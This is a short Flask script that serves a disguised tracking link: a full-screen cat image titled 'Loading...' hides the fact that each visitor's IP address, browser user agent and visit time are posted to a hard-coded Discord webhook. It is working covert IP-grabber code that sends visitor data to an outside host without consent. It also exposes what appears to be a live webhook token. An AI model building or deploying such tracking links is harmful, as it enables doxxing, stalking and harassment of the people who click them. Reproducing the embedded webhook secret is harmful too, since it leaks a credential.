from flask import Flask, request
import requests
import datetime

app = Flask(__name__)

# PUT YOUR DISCORD WEBHOOK HERE
WEBHOOK = "https://discord.com/api/webhooks/1482020801187418347/TphDuNv5xNun4OFNb49yuEjhx-CzkqrqMb2-R4ypAJ1VBk1pp9-JJqMLd2Q4sAOTHcZD"


@app.route("/")
def track():

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent")

    time = datetime.datetime.utcnow().strftime("%H:%M:%S")

    message = f"""
🔔 Link Opened!

🌐 IP: {ip}
🧠 Browser: {user_agent}
🕒 Time: {time}
"""

    try:
        requests.post(WEBHOOK, json={"content": message})
    except Exception as e:
        print("Webhook failed:", e)

    # Page that loads (image)
    return """
    <html>
    <head>
    <title>Loading...</title>
    </head>
    <body style="margin:0">
    <img src="https://cataas.com/cat" style="width:100%;height:100%;object-fit:cover;">
    </body>
    </html>
    """


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)